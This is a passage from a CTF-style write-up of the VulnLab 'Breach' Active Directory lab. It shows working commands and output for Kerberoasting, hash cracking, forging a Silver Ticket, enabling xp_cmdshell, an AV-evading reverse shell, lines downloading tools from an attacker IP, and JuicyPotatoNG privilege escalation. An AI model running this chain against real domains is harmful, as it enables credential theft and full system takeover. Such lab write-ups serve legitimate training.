. D 0 Thu Feb 17 13:24:39 2022  
.. D 0 Mon Feb 24 11:06:34 2025  
local.txt A 36 Thu Feb 17 13:25:02 2022  
  
7863807 blocks of size 4096. 2872298 blocks available  
smb: \transfer\julia.wong\> get local.txt  
getting file \transfer\julia.wong\local.txt of size 36 as local.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)  
smb: \transfer\julia.wong\> SMBecho failed (NT_STATUS_CONNECTION_RESET). The connection is disconnected now 
```

#### Running BloodHound to See Attack Surface

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/Breach]  
└─# bloodhound-python -d 'breach.vl' -u 'julia.wong' -p 'Computer1' -c all -ns 10.10.67.132 --zip  
INFO: Found AD domain: breach.vl  
INFO: Getting TGT for user  
INFO: Connecting to LDAP server: breachdc.breach.vl  
INFO: Found 1 domains  
INFO: Found 1 domains in the forest  
INFO: Found 1 computers  
INFO: Connecting to LDAP server: breachdc.breach.vl  
INFO: Found 15 users  
INFO: Found 54 groups  
INFO: Found 2 gpos  
INFO: Found 2 ous  
INFO: Found 19 containers  
INFO: Found 0 trusts  
INFO: Starting computer enumeration with 10 workers  
INFO: Querying computer: BREACHDC.breach.vl  
INFO: Done in 00M 13S  
INFO: Compressing output into 20250224122435_bloodhound.zip
```

After running **BloodHound**, I spotted a **Kerberoastable** user **svc_mssql**. You can also find this manually using **impacket-GetUserSPNs** or by using **netexec**. But this time, [**netexec** ](https://www.netexec.wiki/ldap-protocol/kerberoasting)did it automatically for us.

![](https://cdn-images-1.medium.com/max/1200/1*L8f6V6NZZrBBg-0N441tRA.png)

*SVC_MSSQL*

When I checked **Julia’s** creds using **netexec**, it gave me the **Kerberoastable** hash. But just for you, bruh, I’ll use **impacket-GetUserSPNs** to get it as well. 😏

```bash
root@kali:/home/kali/VulnLab/Breach/ntlm_theft-master/mav# impacket-GetUserSPNs -request -dc-ip 10.10.67.132 breach.vl/Julia.Wong:'Computer1'  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies  
  
ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation  
-------------------------------- --------- -------- -------------------------- -------------------------- ----------  
MSSQLSvc/breachdc.breach.vl:1433 svc_mssql 2022-02-17 12:43:08.106169 2025-02-24 10:02:38.510951  
  
  
  
[-] CCache file is not found. Skipping...  
$krb5tgs$23$*svc_mssql$BREACH.VL$breach.vl/svc_mssql*$303b6698296a2ede43ee1a15d3478688$4b5f42dd04f67bee3ead565fd52f416e33b1a625d75f1264354ce82dad5febacd1a32d696002c7d0c3a370cc85d5bcc1cdf312608fadd7eedcf23d612cc9044137dcbec948224a4f8cc118cf795d71f18d7eba69e4c1349b8ad72d06495bcadd21d8b3639c632fb6aba2170df9e79be01bcfb7bdce5dab9158eea6061f4f907a9e261f0f5aef2a33aadd57e8cb966a47efbce986e083e915fb7f35f2a774836def891c843ca24a43db8250c6478588984b80379e293428d170964899a91e65dc7f683616ec28b8e110a502787773abff4f6bc47e0b42aa83c5e1c73acc48af40d065c62aff6d2e22a11c6a211f0e0ec853a5279ce9d4dcaebb71e7fdd66e01eb33a2909d2116e0951401ce9438d09196183a614176593fa8cd7d268d771002d5ce551845a5426367bc4a64b9f7926d4139c155e619627710ff3b9f1a2a27cb8991f04f20d39c359cf2a798bae656de7f641ab819ea5f5d6a989fd2f379d1289cafcbcd6a3a0680c0170b870ea13bf88bc23e094ac82bcb45dcfa73b41c32072be2ca41f1d1c1a56f49d5df67a3a16f407983517916941ba1fab27abaa72f81550dd8cf6107222efc42a9fa838bf6dca2510eb2ea7cb0dd7fed1b6a84793f2a95c331ca16e932233b6cf13a3697d9c7b67371b75e9198de8c51d12353db0eb4b9823de3065aab03e36beb47f37b2c17c4900a3a67fe24edb24465a350a5aebbc5baf9c5dbe3ea21714055a1db7948ab242608a7b07490649b3177d33bd7faabae968ed4a624887e8aedcd29d0824287973227f92c83ccc3f319684b825e9fc9c413991f813180b35a311d0c84392d4e63708e587c9262b651a87d4676445d4558cc08c55e448cfbee49080c78338c45b082e732e61c29dde1a2eff8d80ef87f1a40fd2a210e68515d9dbdace40c213ff899252cf69672e50e223968877b6198baa5264d010f590d6db9e2878a7e228287591c9ad3ff2dba1e6e5d4ca0ccf4edc38acc25da22b2f637269ea320e0e66ac2b67e49029777ddc6fec0940e93627557873980db3b901fbf0719e5f3992872ce689964847e8dac09e9bffb294ac3c24c6ae0a7c4a647b5ab653734be8553cc56a3ff106233b78c9a4ffc621fa72af7d3520785a4f667b5bb890299110aa50a5145bbe91174bbc5e6436aad122f5da1570f4e58701967d88157d34388c9941b62ec6d72b452b432296ab583d47bbf315eae5ff84a3ff71f27602952ebbad96152fd11b7cbc256228dce8e8af37155179cc53f9e95852ff61b2d641a03c727fd5142978b6cfe7460f16ffc36e0b15a553e394dbd7c24691aadb56084fabcc8af9a30f163f382a868c1330ec95fc85ef3f213aa404ab09626c6eb82e31aed1f2c869340968399987ea613005a21345c04692d4598f7962ada38dd85ef3fcfa615c6db99cef58c0c854c76db0d1050cb676aa70d9f451ed7529cad7f6e05868f51d918ea1e7a
```

As we saw in **BloodHound**, the **svc_mssql** user has a **Machine SPN**, making it vulnerable to **Kerberoasting**. Alright, let’s crack this hash using **Hashcat** and see what we get!

```bash
root@kali:/home/kali/VulnLab/Breach/ntlm_theft-master/mav# hashcat -m 13100 -a 0 svc_mssql /usr/share/wordlists/rockyou.txt  
hashcat (v6.2.6) starting  
  
OpenCL API (OpenCL 3.0 PoCL 6.0+debian Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]  
============================================================================================================================================  
* Device #1: cpu-penryn-AMD Ryzen 7 4800H with Radeon Graphics, 1926/3916 MB (512 MB allocatable), 4MCU  
  
Minimum password length supported by kernel: 0  
Maximum password length supported by kernel: 256  
  
Hashes: 1 digests; 1 unique digests, 1 unique salts  
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates  
Rules: 1  
  
Optimizers applied:  
* Zero-Byte  
* Not-Iterated  
* Single-Hash  
* Single-Salt  
  
ATTENTION! Pure (unoptimized) backend kernels selected.  
Pure kernels can crack longer passwords, but drastically reduce performance.  
If you want to switch to optimized kernels, append -O to your commandline.  
See the above message to find out about the exact limits.  
  
Watchdog: Temperature abort trigger set to 90c  
  
Host memory required for this attack: 0 MB  
  
Dictionary cache hit:  
* Filename..: /usr/share/wordlists/rockyou.txt  
* Passwords.: 14344385  
* Bytes.....: 139921507  
* Keyspace..: 14344385  
  
$krb5tgs$23$*svc_mssql$BREACH.VL$breach.vl/svc_mssql*$303b6698296a2ede43ee1a15d3478688$4b5f42dd04f67bee3ead565fd52f416e33b1a625d75f1264354ce82dad5febacd1a32d696002c7d0c3a370cc85d5bcc1cdf312608fadd7eedcf23d612cc9044137dcbec948224a4f8cc118cf795d71f18d7eba69e4c1349b8ad72d06495bcadd21d8b3639c632fb6aba2170df9e79be01bcfb7bdce5dab9158eea6061f4f907a9e261f0f5aef2a33aadd57e8cb966a47efbce986e083e915fb7f35f2a774836def891c843ca24a43db8250c6478588984b80379e293428d170964899a91e65dc7f683616ec28b8e110a502787773abff4f6bc47e0b42aa83c5e1c73acc48af40d065c62aff6d2e22a11c6a211f0e0ec853a5279ce9d4dcaebb71e7fdd66e01eb33a2909d2116e0951401ce9438d09196183a614176593fa8cd7d268d771002d5ce551845a5426367bc4a64b9f7926d4139c155e619627710ff3b9f1a2a27cb8991f04f20d39c359cf2a798bae656de7f641ab819ea5f5d6a989fd2f379d1289cafcbcd6a3a0680c0170b870ea13bf88bc23e094ac82bcb45dcfa73b41c32072be2ca41f1d1c1a56f49d5df67a3a16f407983517916941ba1fab27abaa72f81550dd8cf6107222efc42a9fa838bf6dca2510eb2ea7cb0dd7fed1b6a84793f2a95c331ca16e932233b6cf13a3697d9c7b67371b75e9198de8c51d12353db0eb4b9823de3065aab03e36beb47f37b2c17c4900a3a67fe24edb24465a350a5aebbc5baf9c5dbe3ea21714055a1db7948ab242608a7b07490649b3177d33bd7faabae968ed4a624887e8aedcd29d0824287973227f92c83ccc3f319684b825e9fc9c413991f813180b35a311d0c84392d4e63708e587c9262b651a87d4676445d4558cc08c55e448cfbee49080c78338c45b082e732e61c29dde1a2eff8d80ef87f1a40fd2a210e68515d9dbdace40c213ff899252cf69672e50e223968877b6198baa5264d010f590d6db9e2878a7e228287591c9ad3ff2dba1e6e5d4ca0ccf4edc38acc25da22b2f637269ea320e0e66ac2b67e49029777ddc6fec0940e93627557873980db3b901fbf0719e5f3992872ce689964847e8dac09e9bffb294ac3c24c6ae0a7c4a647b5ab653734be8553cc56a3ff106233b78c9a4ffc621fa72af7d3520785a4f667b5bb890299110aa50a5145bbe91174bbc5e6436aad122f5da1570f4e58701967d88157d34388c9941b62ec6d72b452b432296ab583d47bbf315eae5ff84a3ff71f27602952ebbad96152fd11b7cbc256228dce8e8af37155179cc53f9e95852ff61b2d641a03c727fd5142978b6cfe7460f16ffc36e0b15a553e394dbd7c24691aadb56084fabcc8af9a30f163f382a868c1330ec95fc85ef3f213aa404ab09626c6eb82e31aed1f2c869340968399987ea613005a21345c04692d4598f7962ada38dd85ef3fcfa615c6db99cef58c0c854c76db0d1050cb676aa70d9f451ed7529cad7f6e05868f51d918ea1e7a:Trustno1  
  
Session..........: hashcat  
Status...........: Cracked  
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)  
Hash.Target......: $krb5tgs$23$*svc_mssql$BREACH.VL$breach.vl/svc_mssq...ea1e7a  
Time.Started.....: Mon Feb 24 12:36:38 2025 (1 sec)  
Time.Estimated...: Mon Feb 24 12:36:39 2025 (0 secs)  
Kernel.Feature...: Pure Kernel  
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)  
Guess.Queue......: 1/1 (100.00%)  
Speed.#1.........: 181.4 kH/s (0.88ms) @ Accel:256 Loops:1 Thr:1 Vec:4  
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)  
Progress.........: 52224/14344385 (0.36%)  
Rejected.........: 0/52224 (0.00%)  
Restore.Point....: 51200/14344385 (0.36%)  
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1  
Candidate.Engine.: Device Generator  
Candidates.#1....: chloelouise -> lili12  
Hardware.Mon.#1..: Util: 38%  
  
Started: Mon Feb 24 12:36:01 2025  
Stopped: Mon Feb 24 12:36:41 2025  
  
root@kali:/home/kali/VulnLab/Breach/ntlm_theft-master/mav#
```

As I mentioned before, if you log in to **MSSQL** using **Julia’s** creds, you can’t run **xp_cmdshell** and even with **svc_mssql** creds, you still can’t. To bypass this, you need to create a **Silver Ticket** first.

A **Silver Ticket Attack** allows an attacker to **forge authentication tickets** in Active Directory, granting unauthorized access to network resources **without needing valid credentials**. After that, we will pass our ticket, which gives us the capability to run MSSQL with proper permissions — and then, we’ll drop a **reverse shell**.

> A Silver Ticket Attack is a Kerberos-based attack where an attacker forges a service ticket (TGS) instead of the TGT (Ticket Granting Ticket) . This allows unauthorized access to a specific service without needing to communicate with the Domain Controller (KDC) . Since Silver Tickets are generated offline and don’t require KDC validation, they can be harder to detect compared to Golden Ticket Attacks . After forging the Silver Ticket , we pass it to the target service, which gives us elevated access . From there, we’ll execute MSSQL commands with higher permissions — and finally, drop a reverse shell .

![](https://cdn-images-1.medium.com/max/800/1*kZqfBXKmRuDxUCKQ82YkGg.png)

*Silver Ticket Attack*

<div class="video-embed"><iframe src="https://www.youtube.com/embed/szHr07snuRY" title="YouTube video" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen loading="lazy"></iframe></div>

### How to Craft a Silver Ticket

1️⃣ **Get the Domain SID**
2️⃣ **Extract the NTLM Hash of the Target User**
3️⃣ **Find the Service Principal Name (SPN)**
4️⃣ **Forge the Silver Ticket using impacket-ticketer**
5️⃣ **Pass the Ticket to the Target System**
6️⃣ **Access the Target Service with Elevated Permissions**

---

1️⃣ **Get the Domain SID** by using `impacket-lookupsid`.

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/Breach]  
└─# impacket-lookupsid breach.vl/svc_mssql:'Trustno1'@10.10.67.132  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies  
  
[*] Brute forcing SIDs at 10.10.67.132  
[*] StringBinding ncacn_np:10.10.67.132[\pipe\lsarpc]  
[*] Domain SID is: S-1-5-21-2330692793-3312915120-706255856  
498: BREACH\Enterprise Read-only Domain Controllers (SidTypeGroup)  
500: BREACH\Administrator (SidTypeUser)  
501: BREACH\Guest (SidTypeUser)  
502: BREACH\krbtgt (SidTypeUser)  
512: BREACH\Domain Admins (SidTypeGroup)  
513: BREACH\Domain Users (SidTypeGroup)  
514: BREACH\Domain Guests (SidTypeGroup)  
515: BREACH\Domain Computers (SidTypeGroup)  
516: BREACH\Domain Controllers (SidTypeGroup)  
517: BREACH\Cert Publishers (SidTypeAlias)  
518: BREACH\Schema Admins (SidTypeGroup)  
519: BREACH\Enterprise Admins (SidTypeGroup)  
520: BREACH\Group Policy Creator Owners (SidTypeGroup)  
521: BREACH\Read-only Domain Controllers (SidTypeGroup)  
522: BREACH\Cloneable Domain Controllers (SidTypeGroup)  
525: BREACH\Protected Users (SidTypeGroup)  
526: BREACH\Key Admins (SidTypeGroup)  
527: BREACH\Enterprise Key Admins (SidTypeGroup)  
553: BREACH\RAS and IAS Servers (SidTypeAlias)  
571: BREACH\Allowed RODC Password Replication Group (SidTypeAlias)  
572: BREACH\Denied RODC Password Replication Group (SidTypeAlias)  
1000: BREACH\BREACHDC$ (SidTypeUser)  
1101: BREACH\DnsAdmins (SidTypeAlias)  
1102: BREACH\DnsUpdateProxy (SidTypeGroup)  
1103: BREACH\SQLServer2005SQLBrowserUser$BREACHDC (SidTypeAlias)  
1104: BREACH\staff (SidTypeGroup)  
1105: BREACH\Claire.Pope (SidTypeUser)  
1106: BREACH\Julia.Wong (SidTypeUser)  
1107: BREACH\Hilary.Reed (SidTypeUser)  
1108: BREACH\Diana.Pope (SidTypeUser)  
1109: BREACH\Jasmine.Price (SidTypeUser)  
1110: BREACH\George.Williams (SidTypeUser)  
1111: BREACH\Lawrence.Kaur (SidTypeUser)  
1112: BREACH\Jasmine.Slater (SidTypeUser)  
1113: BREACH\Hugh.Watts (SidTypeUser)  
1114: BREACH\Christine.Bruce (SidTypeUser)  
1115: BREACH\svc_mssql (SidTypeUser)
```

2️⃣ **User NTLM Hash** — I just provided the NTLM hash generator with the plaintext password to get the hash for **svc_mssql**.

![](https://cdn-images-1.medium.com/max/1200/1*qURvMITHbNTgaH0Skmc0Ig.png)

*From plaintext password to hash, you can use hashcat for that purpose too, but this method is easier.*

3️⃣ **Service Principal Name (SPN)** — I will use `impacket-GetUserSPNs`, just like I did for **Kerberoasting** before.

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/Breach]  
└─# impacket-GetUserSPNs -request -dc-ip 10.10.67.132 breach.vl/Julia.Wong:'Computer1'  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies  
  
ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation  
-------------------------------- --------- -------- -------------------------- -------------------------- ----------  
MSSQLSvc/breachdc.breach.vl:1433 svc_mssql 2022-02-17 12:43:08.106169 2025-02-24 10:02:38.510951  
  
  
  
[-] CCache file is not found. Skipping...  
$krb5tgs$23$*svc_mssql$BREACH.VL$breach.vl/svc_mssql*$e825e6a2ddae2cfa7c68e57d405defbd$b7e197d0e3397660c6f6dd34b62b87be14ce11621ead11a851fe70c8d7c40cdfc692aa149788f86904bc0fb16f1c6ba235b5d4f9619b309c9e616de95da3dd5c2677f4505ae6cd705f61c63e98048bcac7a47c2829a86946afde32c1679acf018d1b72d69fa9c951e70e45c0376e1e097393a6ed149f613256471344ed18d9c0ffc53b808c8eefad9a6135ef59ddba795ae6ea439d287b2c3ed7498ec95e3d38a4053d92b769c33cbd1a1d3c2da283a519c2f6a5c3478ed2ae13c8abcb2a143f4ff19e780ef3880959e3c119bd508c66d7d90a99e37607b83d55c12f1c6815433964eedd8593e30867f880cc85e49a8a06154df8268e9f887ff9d48880cc2f466bec1411176b6366d6f95d00c3b431fff4b1b413f5c5685b164662dd122f5ef625f339b20c0b66cdaed1a47ddc43fe7861994950a6905c48a07d98421ec254221b6a3e9f51c5e9917a6422ea048ff1605ec7af686a973db556bbf509ef48b77138d472cc25e38d49c04d6cb31b3f19d1aa4470b343f4e08538b16fc2171cb5e1e8f8ec9acd715a69f15bf2a95b70760206b88f183f71147f1e79fca1cfff992b16406ffa4c1ab447a6a7c220943c25dba24866efae9f74a0c774bff10b32e35563a00236ead678825c91d831be6e9dc07e9d1c80d96e9c13506569c310f0e3ed19af62d1ee1f60ec429be0343c3378cedfd5361500948664ca2472524ca9b23f058e31c1e0125fef4615210dcc7399a0d1e57172a27985a334de094a068212e56444a4076e4e7a1fed87b6d39f4c16ead303899dff841350c7dcf90215f16c5e388fe1c6ed44f43b724c7d783abc6a91c3e9874662386f62e803c0ea677caa66781a5358eddac7160d71575f70dfd0304b1800a6e25755897e9f7787356dc9f9163aade9c02f6e1e990d5348b7b578c6943c9b96f3d1e1d99cbc939e9c6c6224786e1f563e8783ac97158eabd18583d08d449dfb172344ca05d6fb659e1343b31530e362b6f45deead72e392fdb9f617469ec53bf4e3a2e61262dcc7539496eec687c1d59c92bdd3fa2c7cad220f81801598006b2a124b0f59fde159b8aa8b14ea00b0328295e9273ab553492145dc9e6864141ae58672268e0c20ba724299413a9f4689ea967d75450eb428bc20c88add50db3bd221d3d014ecdd98f1f412a8e8c4a6f28ae42b96d08780822407a7175e660a5ad2f4e0c6b97b365b43d557137e38a249a40641b4be92775c4ccce29e54a8014e5a8f799edef460a3d7719f89b7634559978f273cc21b8ff15c2f6ab2ae30348ad4061e61bf5c3d6a5c8ffefa90067541d7764dbe471d1ce9c991633e8c53bc571e6f7917f3df8f880dd92fdda777f0c74b40275fffff33f008e33e2f885925b90b1e02f952a3e04110fb5627e48439afb99571b6a91646869e6b053379853af986be2c579646ff357c1d706c458a5b74714a5ae0b8825710124545ab03c16471
```

Now, let’s put everything together using `impacket-ticketer` to execute the attack and generate a **TGS ticket**.

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/Breach]  
└─# impacket-ticketer -nthash '69596C7AA1E8DAEE17F8E78870E25A5C' -domain-sid 'S-1-5-21-2330692793-3312915120-706255856' -domain breach.vl -spn 'MSSQLSvc/breach.vl:1433' -user-id 500 Administrator  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies  
  
[*] Creating basic skeleton ticket and PAC Infos  
/usr/share/doc/python3-impacket/examples/ticketer.py:141: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).  
aTime = timegm(datetime.datetime.utcnow().timetuple())  
[*] Customizing ticket for breach.vl/Administrator  
/usr/share/doc/python3-impacket/examples/ticketer.py:600: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).  
ticketDuration = datetime.datetime.utcnow() + datetime.timedelta(hours=int(self.__options.duration))  
/usr/share/doc/python3-impacket/examples/ticketer.py:718: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).  
encTicketPart['authtime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())  
/usr/share/doc/python3-impacket/examples/ticketer.py:719: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).  
encTicketPart['starttime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())  
[*] PAC_LOGON_INFO  
[*] PAC_CLIENT_INFO_TYPE  
[*] EncTicketPart  
/usr/share/doc/python3-impacket/examples/ticketer.py:843: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).  
encRepPart['last-req'][0]['lr-value'] = KerberosTime.to_asn1(datetime.datetime.utcnow())  
[*] EncTGSRepPart  
[*] Signing/Encrypting final ticket  
[*] PAC_SERVER_CHECKSUM  
[*] PAC_PRIVSVR_CHECKSUM  
[*] EncTicketPart  
[*] EncTGSRepPart  
[*] Saving ticket in Administrator.ccache  
  
┌──(root㉿kali)-[/home/kali/VulnLab/Breach]  
└─# export KRB5CCNAME=Administrator.ccache  
  
┌──(root㉿kali)-[/home/kali/VulnLab/Breach]  
└─# ==i====mpacket-mssqlclient -k -no-pass breach.vl -windows-aut====h==
```

after doing tthe impacket-ticketer command i ptt with export and make imapcket-msssql and voila now we have privilege to enable `xp_cmdshell`

![](https://cdn-images-1.medium.com/max/1200/1*3ol1ht5PvFhynY42SeEgtQ.png)

*Now we have the right privileges to enable xp_cmdshell*

![](https://cdn-images-1.medium.com/max/800/0*ih7xJl6wczHAHX5T.gif)

---

Okay, bro, now what we need is very simple just run a **PowerShell reverse shell** from `impacket-mssqlclient` after enabling **xp_cmdshell**.

But at this stage, it was tough because **AV blocked** the malicious PowerShell reverse shell. You could use any implant from a **C2 framework** like **Havoc** or **Sliver**, but I chose the easy way. So, I ran **HoaxShell**, which provided an **evasive PowerShell payload** to bypass AV. 🔥

![](https://cdn-images-1.medium.com/max/1200/1*dUh0E62XWmtBmzfPbIZhQg.png)

And here we go! 🚀 Now, we need some **situational awareness**.

You can upload **WinPEAS**, **Seatbelt**, **Windows Privilege Checker**, or any privilege escalation tool you prefer. But first, let’s check what privileges we already have! 🔍

After running `whoami /all`, I saw that we have **SeImpersonatePrivilege**. To abuse this, we can use any **Potato exploit**… but did you forget about the **AV**? 🤡 LOL, it will **kill your payloads**, just like it did to mine!

Anyway, let me walk you through exactly what I did:

1️⃣ **Transferred** `JuicyPotatoNG` and an **evasive** version of `nc`.
 2️⃣ **Set up the listener**—now we’re ready to roll! 🚀

To transfer `nc`, I used a simple PowerShell command:

```powershell
wget -usebasicparsing http://10.8.5.124:8888/nc64.exe -o nc64.exe
```

To transfer **JuicyPotatoNG**, I used PowerShell:

```powershell
Invoke-WebRequest -Uri http://your-attacker-ip/JuicyPotatoNG.exe -OutFile C:\Windows\Temp\JuicyPotatoNG.exe
```

And of course, you can use **any** method to transfer files — there are **a ton of ways**!

---

Once transferred, it was time to **execute the exploit** and escalate privileges! 🔥🚀

![](https://cdn-images-1.medium.com/max/1200/1*xuKel6A4p0rQQUSRptiTtA.png)

*Of course, don’t forget to set up our Python server to upload all that. You can useimpacket-smbserverif you want to as well.*

![](https://cdn-images-1.medium.com/max/800/0*zp_UiVDCvLJ9LsVL.gif)

*And boom!We are root!🎉🔥*

---

### 🛡️ Defense & Remediation Strategies 🛡️

<div class="video-embed"><iframe src="https://www.youtube.com/embed/KBRswuYAPo8" title="YouTube video" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen loading="lazy"></iframe></div>

---

### References

- **SMB SCF File Attack:** [https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/)
- **NetCat64:** [https://github.com/vinsworldcom/NetCat64](https://github.com/vinsworldcom/NetCat64)
- **JuicyPotatoNG v1.1:** [https://github.com/antonioCoco/JuicyPotatoNG/releases/tag/v1.1](https://github.com/antonioCoco/JuicyPotatoNG/releases/tag/v1.1)
- **Giving JuicyPotato a Second Chance:** [https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)
- **HoaxShell:** [https://github.com/t3l3machus/hoaxshell](https://github.com/t3l3machus/hoaxshell)
- **MSSQL for Pentesters (xp_cmdshell Execution):** [https://www.hackingarticles.in/mssql-for-pentester-command-execution-with-xp_cmdshell/](https://www.hackingarticles.in/mssql-for-pentester-command-execution-with-xp_cmdshell/)
- **Windows Privilege Escalation (Potatoes Collection):** [https://jlajara.gitlab.io/Potatoes_Windows_Privesc](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)
- **Making nc.exe Viable Again (Bypassing Defender):** [https://steve-s.gitbook.io/0xtriboulet/deceiving-defender/deceiving-defender-making-nc.exe-viable-again](https://steve-s.gitbook.io/0xtriboulet/deceiving-defender/deceiving-defender-making-nc.exe-viable-again)
- **Kerberos Tickets (Swissky’s Guide):** [https://swisskyrepo.github.io/InternalAllTheThings/active-directory/kerberos-tickets/](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/kerberos-tickets/)
- **Silver & Golden Ticket Attacks:** [https://en.hackndo.com/kerberos-silver-golden-tickets/](https://en.hackndo.com/kerberos-silver-golden-tickets/)

![](https://cdn-images-1.medium.com/max/800/1*P7hALQ8ptoT-qep7-i0trw.png)

*attack surface*

![](https://cdn-images-1.medium.com/max/1200/1*yF_j2F0atS49VFa6UyBfcQ.png)

*😂 Hell yeah, brother! Diagrams make everything10 times clearerespecially when flexing thoseattack chainslike a pro! Visualizing thekill chainjust hits differently, you know?*

---

### Do You Wanna Chat with Maverick?🥂

![](https://cdn-images-1.medium.com/max/800/0*f1az4kscXI6fYYzz.gif)

Don’t forget to follow me on [LinkedIn ](https://www.linkedin.com/in/0xmaverick/)and [Twitter](https://x.com/mavric1337), and give me some respect on [Hack The Box!](https://app.hackthebox.com/profile/1054724) i love chatting with like-minded people, sharing knowledge, and learning from everyone. Happy hacking! 🚀

By Mohamed Eletreby on February 25, 2025.

Canonical link

Exported from Medium on April 20, 2026.